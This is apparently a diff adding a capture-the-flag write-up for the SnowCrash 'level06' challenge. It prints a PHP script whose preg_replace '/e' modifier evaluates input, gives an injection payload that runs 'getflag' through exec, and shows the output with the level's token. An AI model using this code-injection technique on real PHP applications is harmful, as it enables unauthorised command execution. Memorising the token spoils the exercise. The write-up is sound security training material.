@@ -1,0 +1,34 @@
+We can see 2 files, 1 binary and 1 php file.
+When we execute the binary, there is an error : 'PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4'
+We can see that the binary execute the php file.
+The php file is :
+
+<?php
+function y($m) {
+	$m = preg_replace("/\./", " x ", $m);
+	$m = preg_replace("/@/", " y", $m);
+	return $m;
+}
+function x($y, $z) {
+	$a = file_get_contents($y);
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+	$a = preg_replace("/\[/", "(", $a);
+	$a = preg_replace("/\]/", ")", $a);
+	return $a;
+}
+$r = x($argv[1], $argv[2]);
+print $r;
+?>
+
+The executable file requires a file to pass to the php script.
+It will read the file content and make it go thourgh a lot of regex.
+Our goal is to find an initial value that will give execute 'getflag' after all the regex have been applied and store it in a file.
+The first regex use '/e' which run the 'eval' function which execute a string as a php script.
+So we want to pass a php script that will execute getflag and we will do that with 'exec'.
+We will pass '[x {${exec(getflag)}}]' so that the regex find a match and execute the string.
+We need the '$' to get the value returned.
+We then execute it with './level06 /tmp/path_to_file' and end up with a php error that contains the flag. 
+
+level06@SnowCrash:~$ ./level06 /tmp/file
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
